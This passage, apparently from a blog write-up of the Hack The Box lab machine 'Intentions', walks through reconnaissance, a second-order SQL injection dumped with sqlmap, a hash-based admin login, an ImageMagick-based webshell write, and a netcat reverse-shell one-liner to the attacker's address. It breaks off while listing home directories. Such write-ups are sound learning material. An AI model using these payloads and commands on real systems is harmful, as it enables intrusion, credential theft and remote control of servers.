+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE   VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh       OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey:
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 47d20066275ee69c808903b58f9e60e5 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> c8d0ac8d299b87405f1bb0a41d538ff1 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http      nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Intentions
+</span></span><span class="line"><span class="cl">4444/tcp open  krb524?
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="port-80---http" class="relative group">port 80 - HTTP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-80---http" aria-label="Anchor">#</a></span></h3><p>Based on the response headers, the website seems to employ a session cookie and JWT token for its functionality.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -ph 10.10.11.220
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">Server: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Set-Cookie: XSRF-TOKEN<span class="o">=</span>eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D<span class="p">;</span> <span class="nv">expires</span><span class="o">=</span>Thu, 13-Jul-2023 01:46:05 GMT<span class="p">;</span> Max-Age<span class="o">=</span>7200<span class="p">;</span> <span class="nv">path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">samesite</span><span class="o">=</span>lax
+</span></span><span class="line"><span class="cl">Set-Cookie: <span class="nv">intentions_session</span><span class="o">=</span>eyJpdiI6IkxsdGdNVmtPV1p4Ry9yaWlGejFjN3c9PSIsInZhbHVlIjoib1RlMm9TWHFSYnIwZjB2NVp1cndPRHN1dWVMa0FNV2ZUYzl2eFJkb3NQaGVzYXR3QW1tL2ZKcklOZlZxNHBNN25RTVpHN1ZwRWxDRnhXNmlWMHZmbzRETE1OcFQwVUVBR1V2TUNwWW1xZktjU2lTc2Z2VXhaenM2S0ZnMis0ZmkiLCJtYWMiOiIzNzZmNjkxMGNjMzFlMDc4ZmViN2Y1ZWI3MzIyZGMwNjU1OTZhNjAxMzZiNjg4MGI0N2Q3NWI1NTE4OWQ1OTlkIiwidGFnIjoiIn0%3D<span class="p">;</span> <span class="nv">expires</span><span class="o">=</span>Thu, 13-Jul-2023 01:46:05 GMT<span class="p">;</span> Max-Age<span class="o">=</span>7200<span class="p">;</span> ...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; urldecode <span class="s1">&#39;eyJpdiI6IndVR0c0dFZTdWQxOWNCRVpMbDhyWVE9PSIsInZhbHVlIjoiTDN3SGJnWFRvczNFcmROak5kYlFuZkQ5cUFtMkMvOGEzT3BCV09DLzh0ZTZoRHViSDRvSVNqNkdTSCtiK0lOdDhKU1Q0WHd2T0JMazBhZ2JpL3lDVlBuamlTdm9zaGVuQklTRkJDUElWa0t0N2RJQlRwSGJRQjNnTzFabk10a0IiLCJtYWMiOiI4ZGNlMDA3MDhhODAzYWM2YzA0ZmUxNWMzMjQ3NmExM2RlY2UzZWY2ZGUyZTk2MjhjYmFiNmNiYzdiOTBhYTkwIiwidGFnIjoiIn0%3D&#39;</span> <span class="p">|</span> base64 -d <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;iv&#34;</span>: <span class="s2">&#34;wUGG4tVSud19cBEZLl8rYQ==&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;value&#34;</span>: <span class="s2">&#34;L3wHbgXTos3ErdNjNdbQnfD9qAm2C/8a3OpBWOC/8te6hDubH4oISj6GSH+b+INt8JST4XwvOBLk0agbi/yCVPnjiSvoshenBISFBCPIVkKt7dIBTpHbQB3gO1ZnMtkB&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;mac&#34;</span>: <span class="s2">&#34;8dce00708a803ac6c04fe15c32476a13dece3ef6de2e9628cbab6cbc7b90aa90&#34;</span>,
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;tag&#34;</span>: <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><p>The website is PHP-based because accessing <code>/index.php</code> leads to the same index page. However, the site offers minimal information, mainly offering options for login and registration.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/index-page.png" alt="index-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<h4 id="directory-enumeration" class="relative group">Directory Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#directory-enumeration" aria-label="Anchor">#</a></span></h4><p>While fuzzing for files and directories, I came across a few interesting directories, and an empty robots.txt file.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.220/FUZZ -o ffuf_intentions.md -of md -t <span class="m">100</span> -fs <span class="m">162</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">admin                   <span class="o">[</span>Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 288ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">css                     <span class="o">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 60ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">favicon.ico             <span class="o">[</span>Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 59ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fonts                   <span class="o">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 59ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">gallery                 <span class="o">[</span>Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 522ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">index.php               <span class="o">[</span>Status: 200, Size: 1523, Words: 415, Lines: 40, Duration: 702ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">js                      <span class="o">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 80ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="nb">logout</span>                  <span class="o">[</span>Status: 302, Size: 322, Words: 60, Lines: 12, Duration: 677ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">robots.txt              <span class="o">[</span>Status: 200, Size: 24, Words: 2, Lines: 3, Duration: 277ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">storage                 <span class="o">[</span>Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 123ms<span class="o">]</span>
+</span></span></code></pre></div><p>Fuzzing recursively with <code>feroxbuster</code> due to the presence of directories like <code>admin</code> and <code>js</code>. Although there was no content under <code>/admin</code>, but there were a few interesting JS files, including <code>admin.js</code> and <code>login.js</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; feroxbuster -u http://10.10.11.220/ -x php,txt,js
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        2l     6382w   311246c http://10.10.11.220/js/admin.js
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        2l     5429w   279176c http://10.10.11.220/js/login.js
+</span></span><span class="line"><span class="cl"><span class="m">302</span>      GET       12l       22w        0c http://10.10.11.220/gallery <span class="o">=</span>&gt; http://10.10.11.220
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        2l     7687w   433792c http://10.10.11.220/js/app.js
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET        2l     6188w   310841c http://10.10.11.220/js/gallery.js
+</span></span><span class="line"><span class="cl"><span class="m">200</span>      GET       39l       94w        0c http://10.10.11.220/index.php
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><!-- Fuzzing recursively with `ffuf` due to the presence of directories like `admin` and `js`. Although there was no content under `/admin`, but there were a few interesting JS files, including `admin.js` and `login.js`.
+
+```bash
+Command line : `ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.10.11.220/FUZZ -o ffuf_intensions_recursive.md -of md -t 100 -fs 162 -e .php,.js -recursion -recursion-depth 1`
+
+  | FUZZ | URL |
+  | :- | :-- |
+  | admin | http://10.10.11.220/admin |
+  | css | http://10.10.11.220/css |
+  | favicon.ico | http://10.10.11.220/favicon.ico |
+  | fonts | http://10.10.11.220/fonts |
+  | gallery | http://10.10.11.220/gallery |
+  | index.php | http://10.10.11.220/index.php |
+  | index.php | http://10.10.11.220/index.php |
+  | js | http://10.10.11.220/js |
+  | logout | http://10.10.11.220/logout |
+  | robots.txt | http://10.10.11.220/robots.txt |
+  | storage | http://10.10.11.220/storage |
+  | vendor | http://10.10.11.220/fonts/vendor |
+  | admin.js | http://10.10.11.220/js/admin.js |
+  | app.js | http://10.10.11.220/js/app.js |
+  | gallery.js | http://10.10.11.220/js/gallery.js |
+  | login.js | http://10.10.11.220/js/login.js |
+  | mdb.js | http://10.10.11.220/js/mdb.js |
+  | architecture | http://10.10.11.220/storage/architecture |
+  | food | http://10.10.11.220/storage/food|
+
+``` -->
+<p>The <code>admin.js</code> file has some interesting content:</p>
+<ul>
+<li>Production environment hosts a v2 API deployment.</li>
+<li>The v2 API seems to transmit password hashes instead of clear text passwords, presumably to enhance security.</li>
+<li>The v2 API has some image editing functionalities, likely using the <a href="https://www.php.net/manual/en/book.imagick.php" target="_blank" rel="noreferrer">Imagick PHP module</a>.</li>
+</ul>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/admin-js-content.png" alt="admin-js-content" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Content from admin.js</figcaption>
+</figure>
+</p>
+<hr>
+<h2 id="foothold" class="relative group">Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#foothold" aria-label="Anchor">#</a></span></h2><hr>
+<p>Successfully registered a user using the registration feature. It appears that there&rsquo;s a gallery and a user feed on the platform, featuring images that can be tagged by genres.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/post-login-index-page.png" alt="post-login-index-page" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/user-feed.png" alt="user-feed" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>After walking the application, it&rsquo;s clear the feed content is dependent on genre preferences in the profile settings. Modifying the genre results in corresponding changes to the feed content.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/profile-settings.png" alt="profile-settings" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>Although, response of a union injection is interesting. All spaces within the payload are stripped out. This can potentially be circumvented by replacing the spaces with SQL comments (<code>/**/</code>).</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/union-sqli-render.png" alt="union-sqli-render" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p><em>Union injection payload</em></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;genres&#34;</span><span class="p">:</span> <span class="s2">&#34;food,travel,nature&#39; union select 1 -- -&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>There might be an escape function in place to sanitize the input for genres. However, since this input has an impact on the feed, there is a potential for exploiting second-order SQL injection.</p>
+<p>Using <code>sqlmap</code>, discovered a second-order SQL injection in there. I successfully exploited the vulnerability using <code>sqlmap</code>, which indicates that the backend database is MariaDB.</p>
+<ul>
+<li><code>gallery_genres.req</code>: The POST request to change the genres → the injection point</li>
+<li><code>galley_feed.req</code>: The GET request for the user feed</li>
+<li><code>space2comment</code>: A sqlmap tamper script to replace spaces with comments, bypassing the sanitization process.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; sqlmap -r gallery_genres.req --level <span class="m">5</span> --risk <span class="m">3</span> --second-req gallery_feed.req --batch --tamper<span class="o">=</span>space2comment --threads <span class="m">10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:08:39<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> <span class="o">(</span>custom<span class="o">)</span> POST parameter <span class="s1">&#39;JSON genres&#39;</span> is <span class="s1">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
+</span></span><span class="line"><span class="cl"><span class="o">(</span>custom<span class="o">)</span> POST parameter <span class="s1">&#39;JSON genres&#39;</span> is vulnerable. Do you want to keep testing the others <span class="o">(</span><span class="k">if</span> any<span class="o">)</span>? <span class="o">[</span>y/N<span class="o">]</span> N
+</span></span><span class="line"><span class="cl">sqlmap identified the following injection point<span class="o">(</span>s<span class="o">)</span> with a total of <span class="m">300</span> HTTP<span class="o">(</span>s<span class="o">)</span> requests:
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">Parameter: JSON genres <span class="o">((</span>custom<span class="o">)</span> POST<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Type: boolean-based blind
+</span></span><span class="line"><span class="cl">    Title: AND boolean-based blind - WHERE or HAVING clause
+</span></span><span class="line"><span class="cl">    Payload: <span class="o">{</span><span class="s2">&#34;genres&#34;</span>:<span class="s2">&#34;food,travel,nature&#39;) AND 2611=2611 AND (&#39;pGZT&#39;=&#39;pGZT&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Type: time-based blind
+</span></span><span class="line"><span class="cl">    Title: MySQL &gt;<span class="o">=</span> 5.0.12 AND time-based blind <span class="o">(</span>query SLEEP<span class="o">)</span>
+</span></span><span class="line"><span class="cl">    Payload: <span class="o">{</span><span class="s2">&#34;genres&#34;</span>:<span class="s2">&#34;food,travel,nature&#39;) AND (SELECT 5190 FROM (SELECT(SLEEP(5)))jJoL) AND (&#39;LKKQ&#39;=&#39;LKKQ&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Type: UNION query
+</span></span><span class="line"><span class="cl">    Title: MySQL UNION query <span class="o">(</span>NULL<span class="o">)</span> - <span class="m">7</span> columns
+</span></span><span class="line"><span class="cl">    Payload: <span class="o">{</span><span class="s2">&#34;genres&#34;</span>:<span class="s2">&#34;food,travel,nature&#39;) UNION ALL SELECT NULL,CONCAT(0x71707a7671,0x6959496e6664714d6c4255494f416975476363525a6d6b7957427a6e7450636b4d536f6b4e68554e,0x7170787a71),NULL,NULL,NULL#&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:08:39<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> changes made by tampering scripts are not included in shown payload content<span class="o">(</span>s<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:08:39<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
+</span></span><span class="line"><span class="cl">web server operating system: Linux Ubuntu
+</span></span><span class="line"><span class="cl">web application technology: Nginx 1.18.0
+</span></span><span class="line"><span class="cl">back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.12 <span class="o">(</span>MariaDB fork<span class="o">)</span>
+</span></span></code></pre></div><p>Exploiting the vulnerability revealed a database named <code>intentions</code> and a couple interesting tables like <code>personal_access_tokens</code> and <code>users</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; sqlmap -r gallery_genres.req --level <span class="m">5</span> --risk <span class="m">3</span> --second-req gallery_feed.req --batch --tamper<span class="o">=</span>space2comment --threads <span class="m">10</span> --dbs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:14:00<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching database names
+</span></span><span class="line"><span class="cl">available databases <span class="o">[</span>2<span class="o">]</span>:
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> information_schema
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> intentions
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&gt; sqlmap -r gallery_genres.req --level <span class="m">5</span> --risk <span class="m">3</span> --second-req gallery_feed.req --batch --tamper<span class="o">=</span>space2comment --threads <span class="m">10</span> -D intentions --tables
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>21:16:57<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fetching tables <span class="k">for</span> database: <span class="s1">&#39;intentions&#39;</span>
+</span></span><span class="line"><span class="cl">Database: intentions
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">4</span> tables<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> gallery_images         <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> migrations             <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> personal_access_tokens <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> users                  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------+
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>Dumped the <code>users</code> table and retrieved information for two admin users: <code>steve</code> and <code>greg</code>, including their corresponding password hashes. The password hashes are encrypted using bcrypt with 10 iterations, which means that decrypting wouldn&rsquo;t be practical.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; sqlmap -r gallery_genres.req --level <span class="m">5</span> --risk <span class="m">3</span> --second-req gallery_feed.req --batch --tamper<span class="o">=</span>space2comment --threads <span class="m">10</span> -D intentions -T users --dump
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Database: intentions
+</span></span><span class="line"><span class="cl">Table: users
+</span></span><span class="line"><span class="cl"><span class="o">[</span><span class="m">33</span> entries<span class="o">]</span>
+</span></span><span class="line"><span class="cl">+----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> id <span class="p">|</span> name                     <span class="p">|</span> admin <span class="p">|</span> email                         <span class="p">|</span> genres                                                                                                                                                          <span class="p">|</span> password                                                     <span class="p">|</span> created_at          <span class="p">|</span> updated_at          <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+----+--------------------------+-------+-------------------------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------------------------------+---------------------+---------------------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">1</span>  <span class="p">|</span> steve                    <span class="p">|</span> <span class="m">1</span>     <span class="p">|</span> steve@intentions.htb          <span class="p">|</span> food,travel,nature                                                                                                                                              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$M</span>/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa <span class="p">|</span> 2023-02-02 17:43:00 <span class="p">|</span> 2023-02-02 17:43:00 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">2</span>  <span class="p">|</span> greg                     <span class="p">|</span> <span class="m">1</span>     <span class="p">|</span> greg@intentions.htb           <span class="p">|</span> food,travel,nature                                                                                                                                              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$95</span>OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m <span class="p">|</span> 2023-02-02 17:44:11 <span class="p">|</span> 2023-02-02 17:44:11 <span class="p">|</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="m">3</span>  <span class="p">|</span> Melisa Runolfsson        <span class="p">|</span> <span class="m">0</span>     <span class="p">|</span> hettie.rutherford@example.org <span class="p">|</span> food,travel,nature
+</span></span></code></pre></div><p>Referring back to the information obtained from the <code>admin.js</code> file, it was revealed that the v2 API offers authentication using hashes. So, there is no need to crack the password hash. When sending login requests through the v2 API, the response specifies the necessity of a hash POST parameter for authentication.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/v2-API-error.png" alt="v2-API-error" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">v2 API error</figcaption>
+</figure>
+</p>
+<p>By including the hash parameter along with its associated value in the request, a 200 response is generated. Furthermore, this response includes the setting of a token cookie, which contains a JWT for the user steve.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/v2-API-admin-login.png" alt="v2-API-admin-login" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Successful admin login via v2 API</figcaption>
+</figure>
+</p>
+<p>Given that Steve possesses admin privileges, utilizing their cookie and navigating to <code>/admin</code> successfully grants access to the admin page. This page corresponds to the JavaScript file uncovered previously.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/admin-page.png" alt="admin-page" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Admin Page</figcaption>
+</figure>
+</p>
+<p>The admin page includes a new <code>Images</code> tab, whereas the user feed and profile settings are no longer present. It provides a list of images used in the application, along with an option to edit them.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/image-list-page.png" alt="image-list-page" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Admin images</figcaption>
+</figure>
+</p>
+<p>The edit page contains information about the selected image, including various effects and other details related to it.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/edit-image-effects.png" alt="edit-image-effects" class="mx-auto my-0 rounded-md" />
+</figure>
+</p>
+<p>When applying one of the effects, a request is sent to the <code>/api/v2/admin/image/modify</code> endpoint. This endpoint expects two parameters, <code>path</code> and <code>effect</code>, and in return, it provides an image data URL as a response.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/modify-image-burp.png" alt="modify-image-burp" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Modify image endpoint</figcaption>
+</figure>
+</p>
+<p>The endpoint accepts a file path. However, when attempting to use a URI, link to an image on my attack box hosted via an HTTP server or the file://<local-file> format, both methods simply return a data URL.
+Considering the Imagick module is being used for the modifications, found an exploit that involves arbitrary object instantiations in PHP: <a href="https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/" target="_blank" rel="noreferrer">Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARM</a></p>
+<p>The exploit employs an MSL file and suggests brute-force for remote code execution, both of which might not be feasible in this scenario. Another approach involves utilizing a VID schema. In ImageMagick, the ReadVIDImage function is used for reading VID schemas, which relies on ExpandFilenames. This function expands arguments if they contain wildcards. By exploiting this behavior, the MSL file can be included in the request. Using two additional schemas, <code>info</code> and <code>caption</code>, a webshell can be written with a single request. Given that the body of the request will carry the MSL file, the request&rsquo;s arguments are transmitted as GET parameters. The <code>effect</code> parameter remains unchanged, while the <code>path</code> parameter is configured as a VID schema.</p>
+<p>With the option to create a webshell, the next step was making it externally accessible to execute the payload. Based on the information of images from the admin page, files are stored at <code>/var/www/html/intentions/storage/app/public/*</code> can be accessed externally using the format <code>http://&lt;IP&gt;/storage/&lt;filename&gt;</code>.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/file-write-exploit.png" alt="file-write-exploit" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Actual Exploit</figcaption>
+</figure>
+</p>
+<p>Sending this request creates a shell at <code>http://&lt;IP&gt;/storage/shell.php</code>, which can gives the ability to execute remote commands using the <code>cmd</code> parameter.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb intentions.htb/storage/shell.php <span class="nv">cmd</span><span class="o">==</span>id
+</span></span><span class="line"><span class="cl">caption:uid<span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl"> CAPTION 120x120 120x120+0+0 16-bit sRGB 2.960u 0:02.962
+</span></span></code></pre></div><p>Using a reverse shell payload, got a shell as <code>www-data</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; http -pb intentions.htb/storage/shell.php <span class="nv">cmd</span><span class="o">==</span><span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.20 9005 &gt;/tmp/f&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt; pc -lp <span class="m">9005</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:16:33<span class="o">]</span> Welcome to pwncat 🐈!                                                                    __main__.py:164
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:16:40<span class="o">]</span> received connection from 10.10.11.220:42804                                                   bind.py:84
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:16:41<span class="o">]</span> 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash                               manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">[</span>03:16:42<span class="o">]</span> 10.10.11.220:42804: registered new host w/ db                                             manager.py:957
+</span></span><span class="line"><span class="cl"><span class="o">(</span><span class="nb">local</span><span class="o">)</span> pwncat$
+</span></span><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions/storage/app/public$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span></code></pre></div><hr>
+<h2 id="shell-as-greg" class="relative group">Shell as greg <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shell-as-greg" aria-label="Anchor">#</a></span></h2><hr>
+<p>Based on the contents of the <code>/home</code> directory and <code>/etc/passwd</code> there are two other user with login shells, <code>legal</code> and <code>greg</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>remote<span class="o">)</span> www-data@intentions:/var/www/html/intentions$ ls -la /home/
+</span></span><span class="line"><span class="cl">total <span class="m">20</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x  <span class="m">5</span> root   root   <span class="m">4096</span> Jun <span class="m">10</span> 14:56 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">18</span> root   root   <span class="m">4096</span> Jun <span class="m">19</span> 13:34 ..
+</span></span><span class="line"><span class="cl">drwxr-x---  <span class="m">4</span> greg   greg   <span class="m">4096</span> Jul <span class="m">14</span> 09:28 greg
